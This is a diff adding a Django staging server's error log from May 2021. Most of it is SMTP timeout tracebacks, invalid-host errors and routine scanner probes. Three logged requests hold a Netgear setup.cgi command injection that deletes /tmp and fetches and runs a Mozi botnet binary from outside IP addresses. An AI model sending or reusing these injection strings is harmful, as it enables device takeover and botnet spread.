@@ -1,0 +1,227 @@
+ERROR|14/May/2021 20:12:32|exception|193123|140667082761984|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|14/May/2021 22:19:33|basehttp|193123|140667082761984|"GET /admin-scripts.asp HTTP/1.1" 500 59
+ERROR|14/May/2021 22:19:33|basehttp|193123|140667082761984|"GET /admin-scripts.asp HTTP/1.1" 500 59
+ERROR|15/May/2021 00:00:46|exception|193123|140667082761984|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|15/May/2021 03:40:32|exception|193123|140667082761984|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|15/May/2021 03:40:32|basehttp|193123|140667082761984|"GET /manager/html HTTP/1.1" 500 59
+ERROR|15/May/2021 05:06:03|basehttp|193123|140667082761984|You're accessing the development server over HTTPS, but it only supports HTTP.
+
+ERROR|15/May/2021 07:09:02|exception|193123|140667082761984|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|15/May/2021 10:36:34|exception|193123|140667082761984|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|15/May/2021 14:15:16|exception|193123|140667057583872|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|15/May/2021 15:15:35|log|193123|140667082761984|Internal Server Error: /getassignmentletter/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/letter/views.py", line 634, in get
+    email.send()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/message.py", line 291, in send
+    return self.get_connection(fail_silently).send_messages([self])
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/backends/smtp.py", line 103, in send_messages
+    new_conn_created = self.open()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/backends/smtp.py", line 63, in open
+    self.connection = self.connection_class(self.host, self.port, **connection_params)
+  File "/usr/lib64/python3.6/smtplib.py", line 251, in __init__
+    (code, msg) = self.connect(host, port)
+  File "/usr/lib64/python3.6/smtplib.py", line 336, in connect
+    self.sock = self._get_socket(host, port, self.timeout)
+  File "/usr/lib64/python3.6/smtplib.py", line 307, in _get_socket
+    self.source_address)
+  File "/usr/lib64/python3.6/socket.py", line 724, in create_connection
+    raise err
+  File "/usr/lib64/python3.6/socket.py", line 713, in create_connection
+    sock.connect(sa)
+TimeoutError: [Errno 110] Connection timed out
+ERROR|15/May/2021 15:15:35|basehttp|193123|140667082761984|"GET /getassignmentletter/?travel_req_id=TR623418 HTTP/1.1" 500 19902
+ERROR|15/May/2021 15:17:13|log|193123|140667047618304|Internal Server Error: /getassignmentletter/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/letter/views.py", line 634, in get
+    email.send()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/message.py", line 291, in send
+    return self.get_connection(fail_silently).send_messages([self])
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/backends/smtp.py", line 103, in send_messages
+    new_conn_created = self.open()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/backends/smtp.py", line 63, in open
+    self.connection = self.connection_class(self.host, self.port, **connection_params)
+  File "/usr/lib64/python3.6/smtplib.py", line 251, in __init__
+    (code, msg) = self.connect(host, port)
+  File "/usr/lib64/python3.6/smtplib.py", line 336, in connect
+    self.sock = self._get_socket(host, port, self.timeout)
+  File "/usr/lib64/python3.6/smtplib.py", line 307, in _get_socket
+    self.source_address)
+  File "/usr/lib64/python3.6/socket.py", line 724, in create_connection
+    raise err
+  File "/usr/lib64/python3.6/socket.py", line 713, in create_connection
+    sock.connect(sa)
+TimeoutError: [Errno 110] Connection timed out
+ERROR|15/May/2021 15:17:13|basehttp|193123|140667047618304|"GET /getassignmentletter/?travel_req_id=TR314432 HTTP/1.1" 500 19903
+ERROR|15/May/2021 17:54:54|exception|193123|140667047618304|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|15/May/2021 19:36:42|log|193123|140667047618304|Internal Server Error: /Otp_Generate/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 1906, in post
+    msg.send()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/message.py", line 291, in send
+    return self.get_connection(fail_silently).send_messages([self])
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/backends/smtp.py", line 103, in send_messages
+    new_conn_created = self.open()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/backends/smtp.py", line 63, in open
+    self.connection = self.connection_class(self.host, self.port, **connection_params)
+  File "/usr/lib64/python3.6/smtplib.py", line 251, in __init__
+    (code, msg) = self.connect(host, port)
+  File "/usr/lib64/python3.6/smtplib.py", line 336, in connect
+    self.sock = self._get_socket(host, port, self.timeout)
+  File "/usr/lib64/python3.6/smtplib.py", line 307, in _get_socket
+    self.source_address)
+  File "/usr/lib64/python3.6/socket.py", line 724, in create_connection
+    raise err
+  File "/usr/lib64/python3.6/socket.py", line 713, in create_connection
+    sock.connect(sa)
+TimeoutError: [Errno 110] Connection timed out
+ERROR|15/May/2021 19:36:42|basehttp|193123|140667047618304|"POST /Otp_Generate/ HTTP/1.1" 500 19604
+ERROR|15/May/2021 19:37:51|log|193123|140667082761984|Internal Server Error: /Otp_Generate/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 1906, in post
+    msg.send()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/message.py", line 291, in send
+    return self.get_connection(fail_silently).send_messages([self])
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/backends/smtp.py", line 103, in send_messages
+    new_conn_created = self.open()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/backends/smtp.py", line 63, in open
+    self.connection = self.connection_class(self.host, self.port, **connection_params)
+  File "/usr/lib64/python3.6/smtplib.py", line 251, in __init__
+    (code, msg) = self.connect(host, port)
+  File "/usr/lib64/python3.6/smtplib.py", line 336, in connect
+    self.sock = self._get_socket(host, port, self.timeout)
+  File "/usr/lib64/python3.6/smtplib.py", line 307, in _get_socket
+    self.source_address)
+  File "/usr/lib64/python3.6/socket.py", line 724, in create_connection
+    raise err
+  File "/usr/lib64/python3.6/socket.py", line 713, in create_connection
+    sock.connect(sa)
+TimeoutError: [Errno 110] Connection timed out
+ERROR|15/May/2021 19:37:51|basehttp|193123|140667082761984|"POST /Otp_Generate/ HTTP/1.1" 500 19605
+ERROR|15/May/2021 19:41:37|log|193123|140667047618304|Internal Server Error: /Otp_Generate/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 1906, in post
+    msg.send()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/message.py", line 291, in send
+    return self.get_connection(fail_silently).send_messages([self])
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/backends/smtp.py", line 103, in send_messages
+    new_conn_created = self.open()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/mail/backends/smtp.py", line 63, in open
+    self.connection = self.connection_class(self.host, self.port, **connection_params)
+  File "/usr/lib64/python3.6/smtplib.py", line 251, in __init__
+    (code, msg) = self.connect(host, port)
+  File "/usr/lib64/python3.6/smtplib.py", line 336, in connect
+    self.sock = self._get_socket(host, port, self.timeout)
+  File "/usr/lib64/python3.6/smtplib.py", line 307, in _get_socket
+    self.source_address)
+  File "/usr/lib64/python3.6/socket.py", line 724, in create_connection
+    raise err
+  File "/usr/lib64/python3.6/socket.py", line 713, in create_connection
+    sock.connect(sa)
+TimeoutError: [Errno 110] Connection timed out
+ERROR|15/May/2021 19:41:37|basehttp|193123|140667047618304|"POST /Otp_Generate/ HTTP/1.1" 500 19639
+ERROR|15/May/2021 21:47:14|exception|193123|140667047618304|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|15/May/2021 22:54:42|basehttp|193123|140667047618304|You're accessing the development server over HTTPS, but it only supports HTTP.
+
+ERROR|15/May/2021 22:54:43|basehttp|193123|140667047618304|You're accessing the development server over HTTPS, but it only supports HTTP.
+
+ERROR|16/May/2021 01:40:53|exception|193123|140667047618304|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|16/May/2021 05:17:47|exception|193123|140667047618304|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|16/May/2021 08:49:03|exception|193123|140667047618304|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|16/May/2021 11:15:46|basehttp|193123|140667047618304|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+ERROR|16/May/2021 12:25:16|exception|193123|140667039225600|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|16/May/2021 12:25:16|basehttp|193123|140667039225600|"GET /manager/html HTTP/1.1" 500 59
+ERROR|16/May/2021 13:47:05|basehttp|193123|140667082671872|"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.49.88:34194/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 59
+ERROR|16/May/2021 16:11:40|exception|193123|140667082671872|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|16/May/2021 20:02:01|basehttp|193123|140667082671872|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+ERROR|16/May/2021 22:57:37|basehttp|193123|140667082671872|"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.106.135:59606/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 59
+ERROR|17/May/2021 00:10:11|basehttp|193123|140667082671872|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+ERROR|17/May/2021 00:27:44|exception|193123|140667082671872|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|17/May/2021 01:31:22|basehttp|193123|140667082671872|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+ERROR|17/May/2021 04:08:29|exception|193123|140667082671872|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|17/May/2021 07:40:43|exception|193123|140667082671872|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|17/May/2021 10:47:43|basehttp|193123|140667039225600|"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.127.46:45139/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 59
+ERROR|17/May/2021 11:23:52|exception|193123|140666621392640|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|17/May/2021 12:07:22|basehttp|193123|140667060717312|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+ERROR|17/May/2021 13:23:51|basehttp|193123|140667060717312|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+ERROR|17/May/2021 15:18:56|exception|193123|140666612999936|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
